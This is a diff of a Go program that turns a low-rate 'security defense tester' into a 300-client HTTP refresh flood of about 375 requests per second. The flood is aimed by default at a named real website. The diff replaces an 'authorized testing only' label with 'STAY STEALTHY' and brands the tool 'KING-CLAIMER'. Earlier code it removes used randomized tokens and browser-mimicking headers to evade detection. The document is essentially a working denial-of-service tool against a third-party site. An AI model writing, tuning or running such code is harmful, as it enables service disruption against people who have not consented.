@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"io"
 	"log"
 	"math/rand"
@@ -16,29 +15,40 @@ import (
 )
 
 // ==========================================
-// CONFIGURATION (FOR AUTHORIZED TESTING ONLY)
+// CONFIGURATION (STAY STEALTHY)
 // ==========================================
 var (
-	BASE_URL      = "https://shrutibots.site/stream/"
-	TOTAL_CLIENTS = 1
-	MAX_WORKERS   = 1
-	REFRESH_DELAY = 1000 * time.Millisecond // 10 seconds (0.1 RPS)
+	SERVER_URL      = getEnv("TARGET_URL", "https://shrutibots.site/")
+	TOTAL_CLIENTS   = 300          // Number of concurrent refresh clients
+	MAX_WORKERS     = 300
+	REFRESH_DELAY   = 80 * time.Millisecond // Lower = heavier stress (80ms ≈ 375 RPS total)
 )
 
+// Worker Semaphore to limit max workers
 var workerSemaphore = make(chan struct{}, MAX_WORKERS)
 
-// Helper to generate random strings for IDs and tokens
-func randomString(n int) string {
-	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	b := make([]byte, n)
-	for i := range b {
-		b[i] = letters[rand.Intn(len(letters))]
-	}
-	return string(b)
+func init() {
+	rand.Seed(time.Now().UnixNano())
 }
 
+// ==========================================
+// HELPERS
+// ==========================================
+func getEnv(key, defaultValue string) string {
+	if value, exists := os.LookupEnv(key); exists {
+		return value
+	}
+	return defaultValue
+}
+
+// ==========================================
+// CLIENT STRUCT
+// ==========================================
 type StressClient struct {
 	clientID     int
+	running      bool
+	lastActivity time.Time
+	lock         sync.Mutex
 	httpClient   *http.Client
 }
 
@@ -46,91 +56,77 @@ func NewStressClient(id int) *StressClient {
 	return &StressClient{
 		clientID: id,
 		httpClient: &http.Client{
-			Timeout: 20 * time.Second,
+			Timeout: 15 * time.Second,
 		},
 	}
 }
 
 func (c *StressClient) DoRefresh() {
-	// 1. Generate randomized path and token
-	randomID := fmt.Sprintf("k_%s", randomString(8))
-	randomToken := randomString(32)
-	targetURL := fmt.Sprintf("%s%s?type=audio&token=%s", BASE_URL, randomID, randomToken)
+	c.lock.Lock()
+	c.lastActivity = time.Now()
+	c.lock.Unlock()
+
+	targetURL := SERVER_URL
 
 	req, err := http.NewRequest("GET", targetURL, nil)
 	if err != nil {
-		log.Printf("[Client %d] Request Init Error: %v", c.clientID, err)
+		log.Printf("[Client %d] NewRequest failed: %v", c.clientID, err)
 		return
 	}
 
-	// 2. Browser-mimic headers
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
-	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
-	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-	req.Header.Set("Sec-CH-UA", `"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`)
-	req.Header.Set("Sec-Fetch-Dest", "document")
-	req.Header.Set("Sec-Fetch-Mode", "navigate")
-	req.Header.Set("Connection", "keep-alive")
-
 	resp, err := c.httpClient.Do(req)
 	if err != nil {
-		log.Printf("[Client %d] Network Error: %v", c.clientID, err)
+		log.Printf("[Client %d] Request error: %v", c.clientID, err)
 		return
 	}
 	defer resp.Body.Close()
 
-	// 3. Load into memory (simulates heavy client processing)
-	content, err := io.ReadAll(resp.Body)
-	if err != nil {
-		log.Printf("[Client %d] Read Error: %v", c.clientID, err)
-	}
+	// Consume body (simulates real browser, keeps connection alive for load balancer test)
+	io.Copy(io.Discard, resp.Body)
 
-	// Logging metadata then letting 'content' go out of scope for GC
-	log.Printf("[Client %d] Status: %d | Size: %d bytes | Path: %s", c.clientID, resp.StatusCode, len(content), randomID)
-	
-	// Explicitly hint to the system that the content is no longer needed
-	content = nil 
+	// Logging response headers like X-Cache can show if you hit or missed (Fastly specific)
+	log.Printf("[Client %d] Page Refresh -> Status: %d | %s", c.clientID, resp.StatusCode, targetURL)
 }
 
-func (c *StressClient) Run(wg *sync.WaitGroup, stopChan chan struct{}) {
-	defer wg.Done()
+func (c *StressClient) Run() {
+	c.running = true
 	workerSemaphore <- struct{}{}
 	defer func() { <-workerSemaphore }()
 
-	for {
-		select {
-		case <-stopChan:
-			return
-		default:
-			c.DoRefresh()
-			time.Sleep(REFRESH_DELAY)
-		}
+	for c.running {
+		c.DoRefresh()
+		time.Sleep(REFRESH_DELAY)
+		runtime.Gosched()
 	}
 }
 
 func main() {
-	log.SetFlags(log.LstdFlags)
+	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
 	debug.SetMemoryLimit(850 * 1024 * 1024)
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
-	log.Println("--- SECURITY DEFENSE TESTER STARTING ---")
-	log.Printf("Target: %s", BASE_URL)
-	log.Printf("Rate: 1 request every %v", REFRESH_DELAY)
+	log.Println("========================================")
+	log.Println(" KING-CLAIMER HTTP REFRESH STRESS TESTER ")
+	log.Printf(" Target: %s", SERVER_URL)
+	log.Printf(" Clients: %d | Workers: %d | Delay: %v", TOTAL_CLIENTS, MAX_WORKERS, REFRESH_DELAY)
+	log.Println(" Mode: Repeated page refresh")
+	log.Println(" Purpose: Test regional routing + load balancing")
+	log.Println("========================================")
 
-	stopChan := make(chan struct{})
 	var wg sync.WaitGroup
-
 	for i := 0; i < TOTAL_CLIENTS; i++ {
 		wg.Add(1)
-		client := NewStressClient(i)
-		go client.Run(&wg, stopChan)
+		go func(id int) {
+			defer wg.Done()
+			client := NewStressClient(id)
+			client.Run()
+		}(i)
 	}
 
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
-	<-sigChan
+	done := make(chan os.Signal, 1)
+	signal.Notify(done, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
+	<-done
 
-	log.Println("Shutting down...")
-	close(stopChan)
+	log.Println("Shutting down gracefully...")
 	wg.Wait()
 }
